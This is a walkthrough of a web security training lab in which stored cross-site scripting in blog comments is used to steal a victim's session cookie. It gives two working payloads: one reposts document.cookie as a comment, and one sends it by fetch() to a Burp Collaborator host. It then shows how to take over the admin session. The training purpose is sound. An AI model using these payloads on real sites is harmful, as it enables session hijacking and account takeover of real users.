## Solution steps

- Open any blog post and write a comment to trigger an alert with random name and email.
- Notice that you can trigger an alert easily with this kind of payload: `<script>alert(1)</script>`
- But in this lab we have to steal victim's session cookie, then use this cookie to impersonate the victim.

- This Lab has 2 solutions, one using Burp Collaborator and another without using Burp Collaborator. I will explain the steps without using burp collaborator as I don't have the premium version. But I will paste the another solution at the bottom from their official solution for your and my convenience :)

### Without using Burp Collaborator

- This solution is considered less subtle because this will make the victim to post their session cookie as a comment and every user visiting the page will be able to see it.
- Open Burp suite and set-up proxy (Keep intercept off).
- Post a random comment.
- From Http history, view `POST /post/comment` and notice that the request contains your session cookie and a `csrf` parameter.
- Copy the following payload and paste it as comment with random name and email:
  ```html
  <script>
  window.addEventListener('DOMContentLoaded', function(){

  var token = document.getElementsByName('csrf')[0].value;
  var data = new FormData();

  data.append('csrf', token);
  data.append('postId', 5);
  data.append('comment', document.cookie);
  data.append('name', 'chris');
  data.append('email', 'chris@01.com');
  data.append('website', 'http://www.chris.com');

  fetch('/post/comment', {
	  method: 'POST',
	  mode: 'no-cors',
	  body: data
  });
  });
  </script>
- Note: Change the `postId` parameter according to the post where you're commenting.
- Go back to the post and view that the session cookie and a secret is posted.
- Copy the session cookie, inspect the page using Ctrl+shift+c and go to application tab.
- Go to cookies and change the session cookie's value with the victim's cookie and hit Enter.

#### How the script works
- This script runs when the page finishes loading. It grabs the `CSRF` token from the page, creates a FormData object, and fills it with the necessary fields to post a comment.
- The key part is that it sets the comment field to document.cookie, which captures the user's cookies. It then uses `fetch()` to send a `POST` request to the `/post/comment` endpoint, silently submitting the stolen cookie as a comment.
- `mode: 'no-cors'` is used to prevent CORS related errors since we donâ€™t need to read the server's response.


### Using Burp Collaborator

- Using Burp Suite Professional, go to the Collaborator tab.
- Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
- Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
  ```html
  <script>
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body:document.cookie
  });
  </script>
- This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
- Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
- Take a note of the value of the victim's cookie in the POST body.
- Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page.
